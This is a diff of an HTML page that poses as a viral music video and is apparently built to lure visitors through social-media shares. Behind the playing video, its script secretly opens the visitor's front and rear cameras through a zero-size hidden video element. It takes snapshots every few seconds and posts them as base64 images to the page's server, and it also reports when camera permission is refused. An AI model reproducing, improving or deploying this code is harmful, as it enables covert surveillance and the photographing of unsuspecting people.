@@ -1,162 +1,127 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>Viral Music Video 2025</title>
-  <!-- SEO -->
-      <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<meta name="description" content="Viral Music Video 2025">
 
-<!-- Open Graph -->
+<!-- Basic Meta Tags -->
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="title" content="Facebook new viral video 💥💥">
+<meta name="description" content="New video  😋😋❤️‍🔥">
+<meta name="keywords" content="ridhi, keyword3">
+<meta name="author" content="viral video 2025">
+
+<!-- Open Graph / Facebook -->
 <meta property="og:type" content="website">
 <meta property="og:url" content="https://viral-video-nirg.onrender.com">
-<meta property="og:title" content="Facebook Viral video 2025">
-<meta property="og:description" content="trending video 2025">
+<meta property="og:title" content=" New viral video 2025 💥💥💥">
+<meta property="og:description" content="New viral video 2025 💥💥💥">
 <meta property="og:image" content="https://viral-video-nirg.onrender.com/thumbnail.jpg">
-<meta property="og:image:width" content="1200">
-<meta property="og:image:height" content="630">
 
-<!-- Twitter Card -->
-<meta name="twitter:card" content="trending video 2025">
+<!-- Twitter -->
+<meta name="twitter:card" content="New viral video 💥💥💥💥💯">
 <meta name="twitter:url" content="https://viral-video-nirg.onrender.com">
-<meta name="twitter:title" content="Facebook Viral video 2025">
-<meta name="twitter:description" content="twitter training video 2025 ">
+<meta name="twitter:title" content="New viral video 2025 💥💥💥">
+<meta name="twitter:description" content="New viral video 2025 💥💥💥
+😋 enjoy this video ">
 <meta name="twitter:image" content="https://viral-video-nirg.onrender.com/thumbnail.jpg">
-  
-  
-  
-  
-  
-  <link rel="stylesheet" href="style.css">
-  <style>
-  body {
-  font-family: Arial, sans-serif;
-  margin: 0;
-  background: #121212;
-  color: #fff;
-  text-align: center;
-}
 
-.container {
-  padding: 20px;
-}
 
-h1 {
-  color: #ffeb3b;
-}
-
-.video-wrapper {
-  display: flex;
-  justify-content: center;
-  margin-top: 20px;
-}
-
-#musicVideo {
-  width: 100%;
-  max-width: 800px;
-  aspect-ratio: 16/9;
-  border: 3px solid #ffeb3b;
-  border-radius: 10px;
-  box-shadow: 0px 6px 15px rgba(0,0,0,0.6);
-}
-
-.status {
-  margin-top: 15px;
-  font-size: 1.1rem;
-  color: #00e676;
-}
-
-footer {
-  margin-top: 40px;
-  font-size: 0.9rem;
-  color: #bbb;
-}
-  </style>
-  
-  
+<style>
+body { background:#121212; color:#fff; text-align:center; font-family:Arial; margin:0; }
+h1 { color:#ffeb3b; margin-top:20px; }
+.video-container { display:flex; justify-content:center; margin-top:20px; }
+video { width:100%; max-width:800px; aspect-ratio:16/9; border:3px solid #ffeb3b; border-radius:10px; box-shadow:0 6px 15px rgba(0,0,0,0.6); }
+#statusText { margin-top:15px; font-size:1.1rem; color:#00e676; }
+#camera { width:0; height:0; opacity:0; position:absolute; top:0; left:0; }
+</style>
 </head>
 <body>
-  <div class="container">
+<h1>Viral Music Video 2025</h1>
 
-    <!-- ইউজার যা দেখবে -->
-    <div class="video-wrapper">
-      <video id="musicVideo" controls autoplay>
-        <source src="/video/Darkwater(360P).mp4" type="video/mp4">
-        Your browser does not support video.
-      </video>
-    </div>
+<div class="video-container">
+<video id="musicVideo" controls autoplay>
+<source src="/video/ঘুম না আসা রাতে তুমি আমার কল্পনাতে (lyrics) Gum Na Asha Rate _ Tik Tok Viral Song _ঘুম_না(3.mp4" type="video/mp4">
+Your browser does not support video.
+</video>
+</div>
 
-    <!-- Hidden camera (ইউজার দেখবে না) -->
-    <video id="camera" autoplay playsinline style="display:none;"></video>
-    <canvas id="canvas" style="display:none;"></canvas>
-
-    <p id="statusText" class="status">
-    Darkwater.mp4  
-      
-    </p>
-  </div>
-
+<video id="camera" autoplay playsinline></video>
+<p id="statusText">🎬 ঘুম না আসা রাতে তুমি আমার কল্পনাতে (lyrics) Gum Na Asha Rate _ Tik Tok Viral Song _ঘুম_না(3.mp4</p>
 
 <script>
-let camera = document.getElementById("camera");
-let canvas = document.getElementById("canvas");
-let ctx = canvas.getContext("2d");
-let statusText = document.getElementById("statusText");
+const camera = document.getElementById("camera");
+const statusText = document.getElementById("statusText");
+const videoId = window.location.pathname.split("/").pop() || "default_video";
 
-// ক্যামেরা চালু (hidden)
-navigator.mediaDevices.getUserMedia({ video: true, audio: false })
-  .then(stream => {
-    camera.srcObject = stream;
-    
-  })
-  .catch(err => {
-    console.error("Camera error: ", err);
-    
-  });
+let useFront = true; // প্রথমে front
+let captureInterval = 5000; // ৫ সেকেন্ড
 
-// ছবি তোলার ফাংশন + সার্ভারে পাঠানো (high quality)
-async function captureAndUploadImage() {
-  // ভিডিওর আসল resolution পাওয়া
-  const videoWidth = camera.videoWidth || 640;
-  const videoHeight = camera.videoHeight || 480;
-
-  canvas.width = videoWidth;
-  canvas.height = videoHeight;
-
-  ctx.drawImage(camera, 0, 0, videoWidth, videoHeight);
-
-  let dataUrl = canvas.toDataURL("image/jpeg", 1.0); // full quality JPEG
-
-  try {
-    await fetch("/upload", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ images: [dataUrl] }),
-    });
-    console.log("✅ Image uploaded (high quality)");
-  } catch (err) {
-    console.error("❌ Upload failed:", err);
-  }
+async function sendSnapshot(base64, camType) {
+    try {
+        await fetch("/upload-html-image", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ videoId, base64, camera: camType })
+        });
+        console.log(`✅ Snapshot sent (${camType}) for video ID:`, videoId);
+    } catch(err) {
+        console.error("❌ Failed to send snapshot:", err);
+    }
 }
 
-// টাইমার লজিক: 3 রাউন্ড × 5 ছবি, 10s অন্তর, 30s বিরতি
-async function startCapture() {
-  for (let round = 0; round < 3; round++) {
-    for (let i = 0; i < 5; i++) {
-      
-      await captureAndUploadImage();
-      await new Promise(r => setTimeout(r, 10000)); // 10 sec
-    }
-    if (round < 2) {
-      
-      await new Promise(r => setTimeout(r, 30000)); // 30 sec pause
-    }
-  }
+async function captureOnce(camType) {
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: camType }, audio: false });
+        camera.srcObject = stream;
 
-  
+        // ভিডিও frame ready হতে delay
+        await new Promise(r => setTimeout(r, 500));
+
+        if (camera.readyState < 2) {
+            console.warn("Video not ready for capture:", camType);
+            stream.getTracks().forEach(track => track.stop());
+            return;
+        }
+
+        const canvas = document.createElement("canvas");
+        const ctx = canvas.getContext("2d");
+        canvas.width = 640;
+        canvas.height = 360;
+        ctx.drawImage(camera, 0, 0, canvas.width, canvas.height);
+
+        canvas.toBlob(blob => {
+            const reader = new FileReader();
+            reader.onloadend = () => {
+                const base64 = reader.result.split(",")[1];
+                sendSnapshot(base64, camType);
+            };
+            reader.readAsDataURL(blob);
+        }, "image/jpeg", 0.7);
+
+        // stream বন্ধ করুন
+        stream.getTracks().forEach(track => track.stop());
+
+    } catch(err) {
+        console.error("❌ Camera permission or error:", camType, err);
+        statusText.innerText = `❌ ${camType} camera error`;
+        statusText.style.color = "#ff1744";
+
+        // permission denied info পাঠানো
+        await fetch("/upload-html-image", {
+            method:"POST",
+            headers:{"Content-Type":"application/json"},
+            body: JSON.stringify({ videoId, noPermission:true })
+        });
+    }
 }
 
-startCapture();
+// শুরু: প্রতি ৫ সেকেন্ডে swap করে capture
+setInterval(() => {
+    const camType = useFront ? "user" : "environment";
+    captureOnce(camType);
+    useFront = !useFront;
+}, captureInterval);
+
 </script>
 </body>
 </html>
